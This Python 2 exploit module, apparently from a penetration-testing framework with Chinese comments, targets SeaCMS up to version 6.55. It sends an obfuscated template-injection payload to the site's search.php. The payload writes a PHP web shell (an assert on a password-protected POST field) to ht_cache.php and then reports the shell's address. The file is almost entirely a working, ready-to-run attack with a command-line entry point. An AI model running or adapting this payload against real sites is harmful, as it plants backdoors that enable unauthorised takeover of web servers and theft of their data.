#coding: utf-8

import os
import sys
import datetime
import re
import json
from exp_template import Exploit, Level, session, get_random_password

"""
构造函数需要传递以下参数:
url      要测试的目标
taskid   默认为0，当没有创建任务时使用
targetid 默认为0，当没有创建任务时使用

exp需要实现的方法为meta_info和exploit

"""
class seacms_v655_getshell(Exploit):
    def meta_info(self):
        return {
            'name': 'seacms_v655_getshell',
            'author': 'h',
            'date': '2018-04-11',
            'attack_type': 'GetShell',
            'app_type': 'CMS',              #路由器为Router
            'app_name': 'SeaCMS',
            'min_version': '',
            'max_version': '6.55',
            'version_list': '',             #min_version,max_version 和 verion_list 二者必选其一
            'description': 'SeaCMS命令执行导致GetShell',
            'reference': 'SeaCMS命令执行导致GetShell.docx',   #参考文档
            'cve':'',
        } 
        
    def exploit(self):
        if self.url == '' or (not self.url.startswith('http://') and not self.url.startswith('https://')):
            self.report('url error', Level.error)
            return
        for i in range(10):
            self.url = self.url.strip('/')
        randpass = get_random_password()
        target = "%s/search.php" % self.url
        exp_data = "searchtype=5&searchword={if{searchpage:year}&&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al({searchpage:lang}&yuyan="
        exp_data+= "join{searchpage:jq}&jq=($_P{searchpage:ver}&ver=OST[3]))&3[]=fil&3[]=e_pu&3[]=t_conten&3[]=ts('ht_cache.php','<?&3[]=ph&3[]=p%20@ass&3[]=ert($_P&3[]=OST["+randpass+"&3[]=]); ?>');"
        headers={
            'Content-Type':'application/x-www-form-urlencoded', 
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36',
            }
        req = session()
        try:
            rsp = req.post(url=target, data=exp_data, headers=headers)
            shell = '%s/ht_cache.php' % self.url
            self.shell_info(shell, randpass, 'php')
        except:
            return


if __name__ == "__main__":
    # url = 'http://192.168.40.26:80'
    # a = seacms_v655_getshell(url)
    # a.exploit()
    if len(sys.argv) == 2:
        a = seacms_v655_getshell(sys.argv[1])
        a.exploit()
    else:
        print '%s url' %  __file__
        print '%s http://192.168.1.11' %  __file__
        

